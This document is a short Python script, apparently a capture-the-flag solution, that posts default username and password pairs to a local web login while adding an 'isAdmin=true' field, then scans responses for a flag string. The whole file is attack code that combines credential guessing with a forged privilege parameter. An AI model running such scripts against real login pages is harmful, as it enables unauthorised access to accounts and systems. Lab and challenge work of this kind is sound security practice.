import urllib.request
import urllib.parse
import re

url = "http://127.0.0.1:32829/index.php"

credentials = [
    ("admin", "admin"),
    ("admin", "password"),
    ("bart", "bart"),
]

print("[*] Testing credentials with isAdmin=true\n")

for username, password in credentials:
    print(f"\n[*] Testing: {username}:{password}")
    
    data = urllib.parse.urlencode({
        "username": username,
        "password": password,
        "isAdmin": "true"
    }).encode()
    
    try:
        req = urllib.request.Request(url, data=data, method='POST')
        with urllib.request.urlopen(req, timeout=10) as response:
            body = response.read().decode('utf-8')
            
            print(f"Status: {response.status}")
            print(f"Length: {len(body)} bytes")
            
            # Check for FLAG
            flag_match = re.search(r'FLAG\{[^}]+\}', body)
            if flag_match:
                print(f"\n[!!!] FLAG FOUND: {flag_match.group(0)}")
                print(f"\nFull response:\n{body}")
            elif len(body) != 1164:
                print(f"Response (anomalous length):\n{body}")
                
    except Exception as e:
        print(f"Error: {str(e)}")

print("\n[*] Complete")

